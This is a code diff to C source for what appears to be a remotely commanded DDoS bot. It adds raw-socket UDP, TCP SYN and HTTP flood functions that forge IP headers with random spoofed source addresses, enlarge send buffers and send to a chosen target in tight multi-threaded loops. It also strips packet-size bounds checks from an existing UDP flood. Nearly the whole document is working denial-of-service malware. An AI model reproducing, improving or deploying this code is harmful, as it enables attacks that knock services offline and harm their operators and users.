@@ -33,6 +33,7 @@
 #define DEFAULT_SIZE 1400
 #define DEFAULT_PPS 100000
 #define DEFAULT_DELAY 1
+#define SOCKETS_PER_THREAD 4
 
 static int sock = -1;
 static int running = 1;
@@ -206,8 +207,7 @@ void *udp_flood(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
     struct sockaddr_in target_addr;
-    char packet[MAX_PACKET];
-    int packet_size;
+    unsigned char *packet;
     time_t end_time;
     int sent_count = 0;
 
@@ -226,18 +226,15 @@ void *udp_flood(void *arg) {
         return NULL;
     }
 
-    packet_size = args->packet_size;
-    if (packet_size > 65507) packet_size = 65507;
-    if (packet_size < 64) packet_size = 64;
-
+    packet = malloc(args->packet_size);
     end_time = time(NULL) + args->duration;
     int delay_us = 1000000 / args->pps;
     if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
-        random_payload((unsigned char *)packet, packet_size);
+        random_payload(packet, args->packet_size);
         
-        int result = sendto(sockfd, packet, packet_size, 0,
+        int result = sendto(sockfd, packet, args->packet_size, 0,
                            (struct sockaddr *)&target_addr, sizeof(target_addr));
         
         if (result > 0) {
@@ -248,8 +245,8 @@ void *udp_flood(void *arg) {
 
         if (args->threads > 1) {
             for (int i = 1; i < args->threads; i++) {
-                random_payload((unsigned char *)packet, packet_size);
-                result = sendto(sockfd, packet, packet_size, 0,
+                random_payload(packet, args->packet_size);
+                result = sendto(sockfd, packet, args->packet_size, 0,
                                (struct sockaddr *)&target_addr, sizeof(target_addr));
                 if (result > 0) {
                     packets_sent++;
@@ -266,6 +263,7 @@ void *udp_flood(void *arg) {
         }
     }
 
+    free(packet);
     close(sockfd);
     return NULL;
 }
@@ -402,16 +400,275 @@ void *http_flood(void *arg) {
     return NULL;
 }
 
-void *tcp_bypass_flood(void *arg) {
+void *raw_udp_flood(void *arg) {
     attack_args_t *args = (attack_args_t *)arg;
     int sockfd;
-    struct sockaddr_in target_addr;
     char packet[MAX_PACKET];
+    struct sockaddr_in target_addr;
+    struct iphdr *ip_header;
+    struct udphdr *udp_header;
+    unsigned char *payload;
+    int packet_size;
+    time_t end_time;
+    int sent_count = 0;
+    int error_count = 0;
+
+    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sockfd < 0) {
+        return NULL;
+    }
+
+    int one = 1;
+    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        close(sockfd);
+        return NULL;
+    }
+
+    int bufsize = 1024 * 1024 * 16;
+    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
+
+    memset(packet, 0, MAX_PACKET);
+    packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + args->packet_size;
+
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(args->port);
+    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
+        close(sockfd);
+        return NULL;
+    }
+
+    end_time = time(NULL) + args->duration;
+    int delay_us = 1000000 / args->pps;
+    if (delay_us < 1) delay_us = 1;
+
+    while (attack_running && time(NULL) < end_time) {
+        ip_header = (struct iphdr *)packet;
+        udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
+        payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
+
+        ip_header->ihl = 5;
+        ip_header->version = 4;
+        ip_header->tos = 0;
+        ip_header->tot_len = htons(packet_size);
+        ip_header->id = htons(rand() & 0xFFFF);
+        ip_header->frag_off = 0;
+        ip_header->ttl = 255;
+        ip_header->protocol = IPPROTO_UDP;
+        ip_header->check = 0;
+        ip_header->saddr = random_ip();
+        ip_header->daddr = target_addr.sin_addr.s_addr;
+
+        udp_header->source = htons(1024 + (rand() % 64511));
+        udp_header->dest = htons(args->port);
+        udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
+        udp_header->check = 0;
+
+        random_payload(payload, args->packet_size);
+        ip_header->check = checksum((unsigned short *)packet, packet_size);
+
+        int result = sendto(sockfd, packet, packet_size, 0,
+                           (struct sockaddr *)&target_addr, sizeof(target_addr));
+        
+        if (result > 0) {
+            packets_sent++;
+            bytes_sent += result;
+            sent_count++;
+        } else {
+            error_count++;
+            if (errno == EPERM || errno == EACCES) {
+                close(sockfd);
+                return NULL;
+            }
+            if (error_count < 10) {
+                usleep(1000);
+            }
+        }
+
+        if (args->threads > 1) {
+            for (int i = 1; i < args->threads; i++) {
+                ip_header = (struct iphdr *)packet;
+                udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
+                payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
+
+                ip_header->ihl = 5;
+                ip_header->version = 4;
+                ip_header->tos = 0;
+                ip_header->tot_len = htons(packet_size);
+                ip_header->id = htons(rand() & 0xFFFF);
+                ip_header->frag_off = 0;
+                ip_header->ttl = 255;
+                ip_header->protocol = IPPROTO_UDP;
+                ip_header->check = 0;
+                ip_header->saddr = random_ip();
+                ip_header->daddr = target_addr.sin_addr.s_addr;
+
+                udp_header->source = htons(1024 + (rand() % 64511));
+                udp_header->dest = htons(args->port);
+                udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
+                udp_header->check = 0;
+
+                random_payload(payload, args->packet_size);
+                ip_header->check = checksum((unsigned short *)packet, packet_size);
+
+                result = sendto(sockfd, packet, packet_size, 0,
+                               (struct sockaddr *)&target_addr, sizeof(target_addr));
+                if (result > 0) {
+                    packets_sent++;
+                    bytes_sent += result;
+                    sent_count++;
+                }
+            }
+        }
+
+        if (args->delay > 0) {
+            usleep(args->delay);
+        } else {
+            usleep(delay_us);
+        }
+    }
+
+    close(sockfd);
+    return NULL;
+}
+
+void *raw_tcp_flood(void *arg) {
+    attack_args_t *args = (attack_args_t *)arg;
+    int sockfd;
+    char packet[MAX_PACKET];
+    struct sockaddr_in target_addr;
+    struct iphdr *ip_header;
+    struct tcphdr *tcp_header;
+    int packet_size;
+    time_t end_time;
+    int sent_count = 0;
+
+    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sockfd < 0) {
+        return NULL;
+    }
+
+    int one = 1;
+    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
+        close(sockfd);
+        return NULL;
+    }
+
+    int bufsize = 1024 * 1024 * 16;
+    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
+
+    memset(packet, 0, MAX_PACKET);
+    packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
+
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_port = htons(args->port);
+    if (inet_pton(AF_INET, args->target, &target_addr.sin_addr) <= 0) {
+        close(sockfd);
+        return NULL;
+    }
+
+    end_time = time(NULL) + args->duration;
+    int delay_us = 1000000 / args->pps;
+    if (delay_us < 1) delay_us = 1;
+
+    while (attack_running && time(NULL) < end_time) {
+        ip_header = (struct iphdr *)packet;
+        tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
+
+        ip_header->ihl = 5;
+        ip_header->version = 4;
+        ip_header->tos = 0;
+        ip_header->tot_len = htons(packet_size);
+        ip_header->id = htons(rand() & 0xFFFF);
+        ip_header->frag_off = 0;
+        ip_header->ttl = 255;
+        ip_header->protocol = IPPROTO_TCP;
+        ip_header->check = 0;
+        ip_header->saddr = random_ip();
+        ip_header->daddr = target_addr.sin_addr.s_addr;
+
+        tcp_header->source = htons(1024 + (rand() % 64511));
+        tcp_header->dest = htons(args->port);
+        tcp_header->seq = rand();
+        tcp_header->ack_seq = rand();
+        tcp_header->doff = 5;
+        tcp_header->syn = 1;
+        tcp_header->window = htons(65535);
+        tcp_header->check = 0;
+        tcp_header->urg_ptr = 0;
+
+        ip_header->check = checksum((unsigned short *)packet, packet_size);
+
+        int result = sendto(sockfd, packet, packet_size, 0,
+                           (struct sockaddr *)&target_addr, sizeof(target_addr));
+        
+        if (result > 0) {
+            packets_sent++;
+            bytes_sent += result;
+            sent_count++;
+        }
+
+        if (args->threads > 1) {
+            for (int i = 1; i < args->threads; i++) {
+                ip_header = (struct iphdr *)packet;
+                tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
+
+                ip_header->ihl = 5;
+                ip_header->version = 4;
+                ip_header->tos = 0;
+                ip_header->tot_len = htons(packet_size);
+                ip_header->id = htons(rand() & 0xFFFF);
+                ip_header->frag_off = 0;
+                ip_header->ttl = 255;
+                ip_header->protocol = IPPROTO_TCP;
+                ip_header->check = 0;
+                ip_header->saddr = random_ip();
+                ip_header->daddr = target_addr.sin_addr.s_addr;
+
+                tcp_header->source = htons(1024 + (rand() % 64511));
+                tcp_header->dest = htons(args->port);
+                tcp_header->seq = rand();
+                tcp_header->ack_seq = rand();
+                tcp_header->doff = 5;
+                tcp_header->syn = 1;
+                tcp_header->window = htons(65535);
+                tcp_header->check = 0;
+                tcp_header->urg_ptr = 0;
+
+                ip_header->check = checksum((unsigned short *)packet, packet_size);
+
+                result = sendto(sockfd, packet, packet_size, 0,
+                               (struct sockaddr *)&target_addr, sizeof(target_addr));
+                if (result > 0) {
+                    packets_sent++;
+                    bytes_sent += result;
+                    sent_count++;
+                }
+            }
+        }
+
+        if (args->delay > 0) {
+            usleep(args->delay);
+        } else {
+            usleep(delay_us);
+        }
+    }
+
+    close(sockfd);
+    return NULL;
+}
+
+void *raw_http_flood(void *arg) {
+    attack_args_t *args = (attack_args_t *)arg;
+    int sockfd;
+    char packet[MAX_PACKET];
+    struct sockaddr_in target_addr;
     struct iphdr *ip_header;
     struct tcphdr *tcp_header;
     char *payload;
     int packet_size;
     time_t end_time;
+    char http_request[4096];
+    int ua_counter = rand() % NUM_USER_AGENTS;
     int sent_count = 0;
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
@@ -442,9 +699,14 @@ void *tcp_bypass_flood(void *arg) {
     if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
-        packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + args->packet_size;
+        build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
+        int http_len = strlen(http_request);
+        
+        packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
+        
         if (packet_size > MAX_PACKET) {
             packet_size = MAX_PACKET;
+            http_len = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
         }
         
         ip_header = (struct iphdr *)packet;
@@ -466,14 +728,15 @@ void *tcp_bypass_flood(void *arg) {
         tcp_header->source = htons(1024 + (rand() % 64511));
         tcp_header->dest = htons(args->port);
         tcp_header->seq = rand();
-        tcp_header->ack_seq = 0;
+        tcp_header->ack_seq = rand();
         tcp_header->doff = 5;
         tcp_header->syn = 1;
         tcp_header->window = htons(65535);
         tcp_header->check = 0;
         tcp_header->urg_ptr = 0;
 
-        random_payload((unsigned char *)payload, args->packet_size);
+        memcpy(payload, http_request, http_len);
+
         ip_header->check = checksum((unsigned short *)packet, packet_size);
 
         int result = sendto(sockfd, packet, packet_size, 0,
@@ -487,9 +750,12 @@ void *tcp_bypass_flood(void *arg) {
 
         if (args->threads > 1) {
             for (int i = 1; i < args->threads; i++) {
-                packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + args->packet_size;
+                build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
+                http_len = strlen(http_request);
+                packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
                 if (packet_size > MAX_PACKET) {
                     packet_size = MAX_PACKET;
+                    http_len = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
                 }
                 ip_header = (struct iphdr *)packet;
                 tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
@@ -510,14 +776,14 @@ void *tcp_bypass_flood(void *arg) {
                 tcp_header->source = htons(1024 + (rand() % 64511));
                 tcp_header->dest = htons(args->port);
                 tcp_header->seq = rand();
-                tcp_header->ack_seq = 0;
+                tcp_header->ack_seq = rand();
                 tcp_header->doff = 5;
                 tcp_header->syn = 1;
                 tcp_header->window = htons(65535);
                 tcp_header->check = 0;
                 tcp_header->urg_ptr = 0;
 
-                random_payload((unsigned char *)payload, args->packet_size);
+                memcpy(payload, http_request, http_len);
                 ip_header->check = checksum((unsigned short *)packet, packet_size);
 
                 result = sendto(sockfd, packet, packet_size, 0,
@@ -616,18 +882,15 @@ void start_attack(char *cmd) {
     
     if (is_root) {
         if (strcasecmp(method, "udp-bypass") == 0 || strcasecmp(method, "udp") == 0) {
-            attack_func = udp_flood;
-            strcpy(actual_method, "udp");
-        } else if (strcasecmp(method, "tcp-bypass") == 0) {
-            attack_func = tcp_bypass_flood;
-            strcpy(actual_method, "tcp-bypass");
-        } else if (strcasecmp(method, "tcp") == 0) {
-            attack_func = tcp_flood;
-            strcpy(actual_method, "tcp");
+            attack_func = raw_udp_flood;
+            strcpy(actual_method, "udp-raw");
+        } else if (strcasecmp(method, "tcp-bypass") == 0 || strcasecmp(method, "tcp") == 0) {
+            attack_func = raw_tcp_flood;
+            strcpy(actual_method, "tcp-raw");
         } else if (strcasecmp(method, "http-bypass") == 0 || strcasecmp(method, "http") == 0) {
-            attack_func = http_flood;
+            attack_func = raw_http_flood;
             strcpy(current_attack.path, "/");
-            strcpy(actual_method, "http");
+            strcpy(actual_method, "http-raw");
         } else {
             if (sock > 0) {
                 send(sock, "ERROR: Unknown method\n", 22, 0);
@@ -639,10 +902,7 @@ void start_attack(char *cmd) {
         if (strcasecmp(method, "udp-bypass") == 0 || strcasecmp(method, "udp") == 0) {
             attack_func = udp_flood;
             strcpy(actual_method, "udp");
-        } else if (strcasecmp(method, "tcp-bypass") == 0) {
-            attack_func = tcp_bypass_flood;
-            strcpy(actual_method, "tcp-bypass");
-        } else if (strcasecmp(method, "tcp") == 0) {
+        } else if (strcasecmp(method, "tcp-bypass") == 0 || strcasecmp(method, "tcp") == 0) {
             attack_func = tcp_flood;
             strcpy(actual_method, "tcp");
         } else if (strcasecmp(method, "http-bypass") == 0 || strcasecmp(method, "http") == 0) {
